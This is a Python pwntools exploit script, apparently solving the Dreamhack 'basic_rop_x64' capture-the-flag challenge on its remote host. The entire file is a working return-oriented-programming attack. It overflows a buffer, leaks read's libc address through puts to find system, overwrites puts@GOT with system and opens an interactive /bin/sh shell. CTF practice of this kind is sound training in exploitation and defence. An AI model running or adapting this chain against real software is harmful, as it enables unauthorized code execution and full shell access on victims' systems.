from pwn import *

# nc host1.dreamhack.games 9564
# p = process("./basic_rop_x64")
p = remote("host1.dreamhack.games", 9564)
libc = ELF("./libc.so.6")
e = ELF("./basic_rop_x64")

pr_gadget = 0x0000000000400883
ppr_gadget = 0x0000000000400881

read_plt = e.plt['read']
read_got = e.got['read']

puts_plt = e.plt['puts']
puts_got = e.got['puts']

input()

pay = b""
pay += b"A" * 0x40
pay += b"X" * 8 # sfp
pay += p64(pr_gadget)
pay += p64(read_got)  # arg
pay += p64(puts_plt) # 

pay += p64(pr_gadget) # pop rdi ; ret, rdi -->  0
pay += p64(0)
pay += p64(ppr_gadget)
pay += p64(puts_got) # pop rsi ; pop r15 ; ret, rsi --> puts_got
pay += p64(0)       # pop r15 ; ret, r15 --> 0
pay += p64(read_plt) 

pay += p64(pr_gadget)
pay += p64(puts_got + 8)
pay += p64(puts_plt)


p.send(pay)

p.recvuntil(b"A" * 0x40)
read_arr = u64(p.recv(6) + b"\x00\x00")
# libc_base = read_arr - 0xf7350
# sys_arr = libc_base + 0x453a0
libc_base = read_arr - libc.symbols['read']
sys_arr = libc_base + libc.symbols['system']
print("[+] read_arr: " + hex(read_arr))
print("[+] libc_base: " + hex(libc_base))
print("[+] system: " + hex(sys_arr))

p.send(p64(sys_arr) + b"/bin/sh\x00")

p.interactive()